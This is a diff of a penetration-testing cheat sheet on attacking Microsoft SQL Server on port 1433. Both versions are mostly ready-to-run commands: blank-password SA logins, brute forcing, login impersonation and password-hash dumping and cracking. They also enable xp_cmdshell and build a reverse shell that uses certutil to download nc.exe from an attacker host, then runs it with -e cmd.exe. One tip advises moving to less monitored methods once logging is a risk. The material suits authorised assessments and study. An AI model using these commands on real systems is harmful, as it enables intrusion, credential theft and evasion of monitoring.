@@ -1,152 +1,95 @@
-```table-of-contents
-```
+# MSSQL (1433)
 
 !!! tip "Start here"
-    Check for SA with blank password: `impacket-mssqlclient sa:@<target>`. If you get in, try `xp_cmdshell` immediately — it's often enabled on unmanaged instances. Enable it if not: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.
+    Try SA with a blank password first: `impacket-mssqlclient sa:@10.10.10.10`. If you get in, run `xp_cmdshell 'whoami'` — it's often already enabled on unmanaged instances. If not, enable it with `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE`.
 
 !!! warning "Watch out"
-    `xp_cmdshell` execution is logged. Use it to establish a shell quickly, then switch to a less monitored persistence method.
+    `xp_cmdshell` execution is logged. Use it to establish a shell quickly, then move to a less monitored method.
+
+---
 
 ## Enumeration
-### Check for Open MSSQL Ports
+
 ```bash
-nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config <target-ip>
+nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config 10.10.10.10
 ```
 
 ---
-## User Impersonation
-If you are able to log into MSSQL with a user who has low privileges, you may be able to impersonate another user with higher privileges. First, use the following to print a table of users to impersonate:
-```sql
-SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'  
-```
 
-If any results come back, attempt to login:
-```sql
-EXECUTE AS LOGIN = 'user'
-```
+## Authentication
 
-Reference: [[Hokkaido#MSSQL]]
-
----
-## RCE via MSSQL
-If **authentication is obtained**, execute **remote commands**.
-Impacket:
 ```bash
-impacket-mssqlclient 'DOMAIN/username':'password'@<target-ip> -windows-auth
-```
-
-Run OS commands:
-```sql
-xp_cmdshell 'whoami';
-```
-
-Using CrackMapExec:
-```bash
-crackmapexec mssql <target-ip> -u sa -p password --exec "whoami"
+impacket-mssqlclient sa:@10.10.10.10
+impacket-mssqlclient 'EXAMPLE/username':'password'@10.10.10.10 -windows-auth
 ```
 
 ---
-## Authentication Attacks
-### Brute-Force Credentials
-Hydra:
-```bsah
-hydra -L users.txt -P passwords.txt mssql://<target-ip> -V
-```
 
-CrackMapExec:
-```bash
-crackmapexec mssql <target-ip> -u users.txt -p passwords.txt
-```
+## Brute Force
 
-MSF:
 ```bash
-msfconsole
-use auxiliary/scanner/mssql/mssql_login
-set RHOSTS <target-ip>
-set USER_FILE users.txt
-set PASS_FILE passwords.txt
-run
+crackmapexec mssql 10.10.10.10 -u users.txt -p passwords.txt
+hydra -L users.txt -P passwords.txt mssql://10.10.10.10
 ```
 
 ---
-## Exploiting Misconfigurations
-### MSSQL Command Execution via `xp_cmdshell`
-If you have **sysadmin** privileges, enable `xp_cmdshell` to execute system-level commands:
+
+## xp_cmdshell RCE
+
+Enable if disabled:
 ```sql
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+```
+
+Execute commands:
+```sql
 EXEC xp_cmdshell 'whoami';
 ```
 
-### Reverse Shell via MSSQL
-If SQL Injection is discovered on a target, use the following payload to enable command execution via `xp_cmdshell`, download `nc.exe`, and obtain a reverse shell.
+Reverse shell via certutil + nc:
 ```sql
-EXEC sp_configure 'show advanced options',1;
-RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell',1;
-RECONFIGURE;
-EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.45.196:8000/nc.exe C:\users\public\nc.exe';
-EXEC xp_cmdshell 'C:\users\public\nc.exe 192.168.45.196 9005 -e cmd.exe';--
+EXEC xp_cmdshell 'certutil -urlcache -f http://<attacker-ip>:8000/nc.exe C:\users\public\nc.exe';
+EXEC xp_cmdshell 'C:\users\public\nc.exe <attacker-ip> 9001 -e cmd.exe';
 ```
-* Bring `nc.exe` into the terminal window to obtain the shell, then start python server.
-* URL encode payload and send.
-
-### Reverse Shell via Encoded Powershell
-First, create a payload from https://revshells.com using PowerShell #3 (Base64)
 
 ---
-## Extracting Credentials from MSSQL
-### Dumping User Creds
+
+## User Impersonation
+
+Check who can be impersonated with the current login:
+```sql
+SELECT DISTINCT b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+```
+
+Switch to that login:
+```sql
+EXECUTE AS LOGIN = 'sa';
+```
+
+---
+
+## Credential Extraction
+
 ```sql
 SELECT name, password_hash FROM sys.sql_logins;
 ```
-### Extracting NTLM Hashes
-MSF:
-```bash
-msfconsole
-use auxiliary/admin/mssql/mssql_hashdump
-set RHOSTS <target-ip>
-set USERNAME sa
-set PASSWORD <password>
-run
-```
 
-### Cracking MSSQL Hashes
 ```bash
 hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 ---
-## Dumping MSSQL Password Hashes
-Using Metasploit:
-```bash
-use auxiliary/admin/mssql/mssql_hashdump
-set RHOSTS <target-ip>
-set USERNAME sa
-set PASSWORD <password>
-run
-```
 
-Hashes can be cracked using Hashcat:
-```bash
-hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
-```
+## Quick SQL Reference
 
----
-## Quick Command References
-List all databases:
 ```sql
-SELECT name FROM master..sysdatabases;
+SELECT name FROM master..sysdatabases;                              -- list databases
+USE database_name; SELECT name FROM sysobjects WHERE xtype='U';    -- list tables
+SELECT * FROM table_name;                                           -- dump table
 ```
 
-List all tables within database:
-```sql
-USE database_name;
-SELECT name FROM sysobjects WHERE xtype='U';
-```
-
-Dump table data:
-```sql
-SELECT * FROM table_name;
-```
-
+!!! tip "Real-world"
+    SA with a blank password is more common than it should be, especially on developer workstations and legacy installations. On internal assessments, also check for linked servers (`SELECT * FROM sys.servers`) — a low-privilege MSSQL instance linked to a high-privilege one is a common lateral movement path.
